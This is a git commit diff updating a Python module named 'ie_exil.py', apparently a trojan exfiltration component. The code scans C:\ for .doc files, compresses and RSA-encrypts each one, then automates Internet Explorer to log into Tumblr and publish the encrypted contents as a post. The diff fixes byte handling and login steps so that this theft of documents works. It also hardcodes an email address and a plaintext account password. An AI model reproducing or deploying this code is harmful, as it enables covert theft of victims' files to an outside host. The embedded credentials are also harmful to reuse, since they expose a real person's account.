46730c1cab2b9a5d4f19dbe2b457648ef5143b33
Allevon412 <41178870+Allevon412@users.noreply.github.com>
2019-06-08 16:38:16 -0700

    Update ie_exil.py

--- modules/ie_exil.py
+++ modules/ie_exil.py
@@ -4,14 +4,16 @@ import fnmatch
 import time
 import random
 import zlib
+import base64
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
 
-doc_type = ".docx"
-username = "Allevon412"
+doc_type = ".doc"
+username = "ufcbrendan1@gmail.com"
 password = "Gr4nd3r_123!@*"
 
 public_key = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAs8rrdhb7JB+oQMBi8ZnB\nno5B6tT/shrBc8sxjiN/DMdG8Jo3+g091PHe4uYXDtssPGbstnYnCS7rT4rmCW4o\n31fawaxZymOM3ys/HOVzuOMlWVQG+8UxC7+OJmepKWbDW9lrjfbt5mtN4QQBJNtA\nRoMMS7c35WVijscSoXqR2cs63jCLSFEeBLiui3sVHhZI2Bi+eYn2TtYj7B6sqjE4\nOtMksCSTp+uVGLwmhgVN0xxMtlHGVlOjML91JRcFOOZQB2bC7buQW61VZmPWTDGy\n5QbQJNbn9rgxVVlQunk1wbiJ7V0zEjmsz8dlBTE0ijmrGxUOj1tfCJspRlw6rbJU\nSwIDAQAB\n-----END PUBLIC KEY-----"
+
 
 def wait_for_browser(browser):
 
@@ -22,29 +24,38 @@ def wait_for_browser(browser):
     return
 
 def encrypt_String(plaintext):
-    chunk_size = 256
-    print("[*] Compressing: %d bytes" % len(plaintext))
-    plaintext = zlib.compress(plaintext)
+    chunk_size = 200
+    print(type(plaintext))
+    if isinstance(plaintext, str):
+        print("[*] Changing string %s to bytes" % plaintext)
+        plaintext_as_bytes = str.encode(plaintext)
+        print("[*] Compressing: %d bytes" % len(plaintext))
+        plain_text = zlib.compress(plaintext_as_bytes)
+    else:
+        print("[*] Compressing: %d bytes" % len(plaintext))
+        plain_text = zlib.compress(plaintext)
 
-    print("[*] Encrypting %d bytes" % len(plaintext))
+    print("[*] Encrypting %d bytes" % len(plain_text))
 
     rsakey = RSA.import_key(public_key)
     rsakey = PKCS1_OAEP.new(rsakey)
 
-    encrypted = ""
+    encrypted = b""
     offset = 0
 
-    while offset < len(plaintext):
+    while offset < len(plain_text):
 
-        chunk = plaintext[offset:offset+chunk_size]
+        chunk = plain_text[offset:offset+chunk_size]
 
         if len(chunk) % chunk_size != 0:
-            chunk += " " * (chunk_size - len(chunk))
+            print(str(len(chunk)))
+            chunk += str.encode(" " * (chunk_size - len(chunk)))
+            print(str(len(chunk)))
 
         encrypted += rsakey.encrypt(chunk)
         offset += chunk_size
 
-    encrypted = encrypted.encode("base64")
+    encrypted = base64.b64encode(encrypted)
 
     print("Base64 encoded crypto: %d" % len(encrypted))
 
@@ -65,7 +76,7 @@ def encrypt_post(filename):
 
 
 def random_sleep():
-    time.sleep(random.randint(5,10))
+    time.sleep(random.randint(5, 10))
     return
 
 
@@ -78,9 +89,24 @@ def login_to_tumblr(ie):
     for i in full_doc:
         if i.id == "signup_email":
             i.setAttribute("value", username)
-
+        elif i.id == "signup_determine_email":
+            i.setAttribute("value", username)
         elif i.id == "signup_password":
             i.setAttribute("value", password)
+        elif i.id == "signup_forms_submit":
+            print("Found Next button")
+            post_form = i
+            i.focus()
+            post_form.children[0].click()
+
+    random_sleep()
+
+    full_doc = ie.Document.all
+    for i in full_doc:
+        if i.id == "signup_magiclink":
+            post_form = i
+            post_form.children[1].click()
+
 
     random_sleep()
     try:
@@ -104,11 +130,11 @@ def post_to_tumblr(ie, title, post):
     full_doc = ie.Document.all
 
     for i in full_doc:
-        if i.id == "post_one":
-            i.setAttribute("value", title)
+        if i.style == "min-height: 42px;":
+            i.setAttribute("innerHTML", title)
             title_box = i
             i.focus()
-        elif i.id == "post_two":
+        elif i.style == "min-height: 80px;":
             i.setAttribute("innerHTML", post)
             print("Set text area")
             i.focus()
@@ -137,7 +163,7 @@ def exfiltrate(document_path):
     ie.Visible = 1
 
     # head to tumblr and login
-    ie.Navigate("http://www.tumblr.com/login")
+    ie.Navigate("https://tumblr.com/login")
     wait_for_browser(ie)
 
     print("[*] Logging into Tumblr")
@@ -151,7 +177,7 @@ def exfiltrate(document_path):
     title, body = encrypt_post(document_path)
 
     print("Creating new post...")
-    post_to_tumblr(ie,title,body)
+    post_to_tumblr(ie, title, body)
     print("Posted!")
 
     # destroy the IE instance
@@ -164,7 +190,10 @@ def exfiltrate(document_path):
 # NOTE: no tab for first line of code below
 for parent, directories, filenames in os.walk("C:\\"):
     for filename in fnmatch.filter(filenames, "*%s" % doc_type):
-        document_path = os.path.join(parent, filename)
-        print("Found: %s" % document_path)
-        exfiltrate(document_path)
-        input("Continue?")
+        if parent == "C:\\Users\\bortiz\\Desktop":
+            document_path = os.path.join(parent, filename)
+            print("Found: %s" % document_path)
+            exfiltrate(document_path)
+            input("Continue?")
+        else:
+            continue
